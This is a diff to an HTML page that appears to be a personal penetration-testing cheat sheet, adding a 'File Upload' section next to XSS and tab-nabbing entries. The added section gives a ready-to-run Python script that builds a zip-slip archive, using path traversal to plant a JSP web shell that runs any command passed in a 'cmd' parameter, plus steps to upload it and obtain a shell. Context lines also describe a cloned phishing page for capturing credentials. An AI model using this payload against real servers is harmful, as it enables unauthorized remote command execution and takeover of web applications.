@@ -107,6 +107,7 @@
       <li><a href="#click-jacking">Click jacking</a></li>
       <li><a href="#ssti">SSTI</a></li>
       <li><a href="#tab-nabbing">Tab Nabbing</a></li>
+      <li><a href="#file-upload">File Upload</a></li>
       <li><a href="#xss-image-upload">XSS Image Upload</a></li>
       <li><a href="#host-header-injection">Host Header Injection</a></li>
       <li><a href="#file-path-traversal">File path traversal</a></li>
@@ -1761,7 +1762,21 @@ test
 - The malicious html page above will pointing to index.html which would fool the victim send credentials through it (index.html should be cloned from the vuln web)
 - May need to use wireshark to catch creds from POST request
 </code></pre></div></div>
-
+<hr>
+<h3 id="file-upload">File Upload</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>#If allow to upload .zip,.tar,.jar,.war,.cpio,.apk,.rar,.7z file</strong>
+Try zipslip attack:
+1. Generate a payload zip file:
+#python script (run on windows)
+###Begin###
+import zipfile
+with zipfile.ZipFile("payload.zip", "a") as my_zip:
+    my_zip.writestr("..\\..\\..\\..\\Server\\webapps\\ROOT\\test.jsp",'<%@ page import="java.util.*,java.io.*"%>&lt;HTML>&lt;BODY>&lt;FORM METHOD="GET" NAME="myform" ACTION="">&lt;INPUT TYPE="text" NAME="cmd">&lt;INPUT TYPE="submit" VALUE="Send">&lt;/FORM>&lt;pre><%if (request.getParameter("cmd") != null) {out.println("Command: " + request.getParameter("cmd") + "&lt;BR>");Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr); disr = dis.readLine();}}%>&lt;/pre>&lt;/BODY>&lt;/HTML>')
+    my_zip.printdir()
+###END###
+2. Upload the generated payload.zip, then browse the test.jsp page -> got web shell.
+</code></pre></div></div>
+<hr>
 <h3 id="xss-image-upload">XSS Image Upload</h3>
 <h4>SVG</h4>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" standalone="no"?>
